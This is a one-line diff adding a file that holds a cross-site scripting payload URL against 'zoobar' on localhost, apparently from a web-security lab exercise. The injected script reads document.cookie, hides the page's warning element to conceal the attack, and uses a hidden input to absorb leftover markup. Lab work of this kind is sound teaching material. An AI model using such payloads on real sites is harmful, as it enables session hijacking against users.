@@ -1,0 +1,1 @@
+localhost:8080/zoobar/index.cgi/users?user="><script>console.log(document.cookie);document.addEventListener("DOMContentLoaded", function(event) {document.getElementsByClassName('warning')[0].style="display:none";})</script><input style="display:none
